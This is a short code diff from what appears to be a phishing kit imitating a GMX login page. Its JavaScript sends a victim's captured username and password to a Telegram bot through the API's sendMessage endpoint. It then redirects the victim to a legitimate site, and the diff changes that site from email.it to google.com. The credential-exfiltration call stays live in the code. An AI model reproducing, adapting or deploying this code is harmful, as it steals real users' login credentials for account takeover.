@@ -229,7 +229,7 @@ footer#footer ul li{
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=GMX-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://www.email.it");
+              window.location.replace("http://google.com/");
           }, error => {
               alert("Message not sent")
               console.log(error)
